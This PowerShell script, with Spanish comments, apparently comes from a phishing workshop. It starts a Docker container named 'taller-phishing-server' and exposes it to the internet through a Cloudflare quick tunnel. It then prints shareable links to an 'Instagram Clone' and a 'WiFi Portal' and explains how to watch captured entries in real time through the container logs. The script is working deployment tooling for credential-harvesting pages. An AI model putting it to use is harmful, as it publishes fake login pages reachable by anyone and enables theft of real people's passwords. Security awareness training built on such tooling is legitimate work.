# Script para crear un túnel público con Cloudflared
# Uso: .\iniciar_tunel_publico.ps1

Write-Host ""
Write-Host "=============================================" -ForegroundColor Cyan
Write-Host "  INICIANDO TÚNEL PÚBLICO CON CLOUDFLARED" -ForegroundColor Cyan
Write-Host "=============================================" -ForegroundColor Cyan
Write-Host ""

# Buscar cloudflared
$cloudflaredPath = Get-ChildItem "$env:LOCALAPPDATA\Microsoft\WinGet\Packages" -Recurse -Filter "cloudflared.exe" -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName

if (-not $cloudflaredPath) {
    Write-Host "❌ Cloudflared no encontrado" -ForegroundColor Red
    Write-Host "   Instalando Cloudflared..." -ForegroundColor Yellow
    winget install --id Cloudflare.cloudflared -e --silent
    Write-Host "   ✅ Instalado. Por favor ejecuta este script nuevamente." -ForegroundColor Green
    exit
}

Write-Host "✅ Cloudflared encontrado: $cloudflaredPath" -ForegroundColor Green
Write-Host ""

# Verificar si el contenedor está corriendo
$container = docker ps --filter "name=taller-phishing-server" --format "{{.Names}}"

if (-not $container) {
    Write-Host "🚀 Iniciando servidor Docker..." -ForegroundColor Yellow
    docker run -d --rm -p 5000:5000 --name taller-phishing-server taller-phishing | Out-Null
    Start-Sleep -Seconds 3
    Write-Host "✅ Servidor iniciado" -ForegroundColor Green
    Write-Host ""
}

Write-Host "🌐 Creando túnel público (esto puede tardar unos segundos)..." -ForegroundColor Yellow
Write-Host ""

# Crear túnel en segundo plano y capturar la URL
$job = Start-Job -ScriptBlock {
    param($cloudflaredPath)
    & $cloudflaredPath tunnel --no-autoupdate --url http://localhost:5000 2>&1
} -ArgumentList $cloudflaredPath

# Esperar a que se genere la URL
Start-Sleep -Seconds 5

# Obtener la salida del job
$output = Receive-Job $job

# Extraer la URL
$url = ($output | Select-String -Pattern "https://.*\.trycloudflare\.com" | Select-Object -First 1).Matches.Value

if ($url) {
    Write-Host "=============================================" -ForegroundColor Green
    Write-Host "  ✅ TÚNEL PÚBLICO ACTIVADO" -ForegroundColor Green
    Write-Host "=============================================" -ForegroundColor Green
    Write-Host ""
    Write-Host "📱 Comparte estas URLs (accesibles desde cualquier lugar):" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "   Instagram Clone:" -ForegroundColor White
    Write-Host "   $url" -ForegroundColor Green
    Write-Host ""
    Write-Host "   WiFi Portal:" -ForegroundColor White
    Write-Host "   $url/wifi" -ForegroundColor Green
    Write-Host ""
    Write-Host "=============================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "⚡ El túnel está activo y permanecerá así mientras:" -ForegroundColor Yellow
    Write-Host "   - Este script esté ejecutándose" -ForegroundColor Gray
    Write-Host "   - No cierres esta ventana" -ForegroundColor Gray
    Write-Host ""
    Write-Host "📊 Para ver capturas en tiempo real, abre otra terminal y ejecuta:" -ForegroundColor Cyan
    Write-Host "   docker logs -f taller-phishing-server" -ForegroundColor Gray
    Write-Host ""
    Write-Host "🛑 Para detener el túnel, presiona CTRL+C" -ForegroundColor Yellow
    Write-Host "=============================================" -ForegroundColor Cyan
    Write-Host ""
    
    # Mantener el job corriendo
    Write-Host "⏳ Túnel activo... (presiona CTRL+C para detener)" -ForegroundColor Green
    Wait-Job $job
} else {
    Write-Host "❌ No se pudo crear el túnel" -ForegroundColor Red
    Write-Host "   Salida del comando:" -ForegroundColor Yellow
    $output | ForEach-Object { Write-Host "   $_" -ForegroundColor Gray }
}

# Limpiar
Remove-Job $job -Force
